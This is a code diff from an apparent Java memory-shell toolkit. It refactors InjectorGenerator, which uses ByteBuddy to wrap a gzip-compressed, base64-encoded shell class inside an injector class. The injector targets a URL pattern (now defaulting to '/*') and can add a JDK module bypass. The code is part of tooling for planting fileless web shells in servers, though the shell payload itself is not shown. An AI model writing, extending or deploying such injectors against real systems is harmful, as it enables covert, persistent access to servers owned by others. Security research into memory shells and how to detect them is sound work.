@@ -3,6 +3,8 @@ package com.reajason.javaweb.memsell;
 import com.reajason.javaweb.buddy.ByPassJdkModuleInterceptor;
 import com.reajason.javaweb.buddy.TargetJDKVersionVisitorWrapper;
 import com.reajason.javaweb.config.Constants;
+import com.reajason.javaweb.config.InjectorConfig;
+import com.reajason.javaweb.config.ShellConfig;
 import com.reajason.javaweb.util.CommonUtil;
 import lombok.SneakyThrows;
 import net.bytebuddy.ByteBuddy;
@@ -22,21 +24,19 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
 public class InjectorGenerator {
 
     @SneakyThrows
-    public static byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern) {
-        return generate(injectClass, injectClassName, shellClassName, shellBytes, urlPattern, Constants.DEFAULT_VERSION);
-    }
-
-    @SneakyThrows
-    public static byte[] generate(Class<?> injectClass, String injectClassName, String shellClassName, byte[] shellBytes, String urlPattern, int targetJdkVersion) {
-        String base64String = Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), "");;
+    public static byte[] generate(ShellConfig config, InjectorConfig injectorConfig) {
+        String base64String = Base64.encodeBase64String(
+                        CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()))
+                .replace(System.lineSeparator(), "");
         DynamicType.Builder<?> builder = new ByteBuddy()
-                .redefine(injectClass)
-                .name(injectClassName)
-                .visit(new TargetJDKVersionVisitorWrapper(targetJdkVersion))
-                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(urlPattern, "")))
+                .redefine(injectorConfig.getInjectorClass())
+                .name(injectorConfig.getInjectorClassName())
+                .visit(new TargetJDKVersionVisitorWrapper(config.getTargetJdkVersion()))
+                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                 .method(named("getBase64String")).intercept(FixedValue.value(base64String))
-                .method(named("getClassName")).intercept(FixedValue.value(shellClassName));
-        if (targetJdkVersion >= Opcodes.V9) {
+                .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));
+
+        if (config.needByPassJdkModule()) {
             builder = ByPassJdkModuleInterceptor.extend(builder);
         }
 
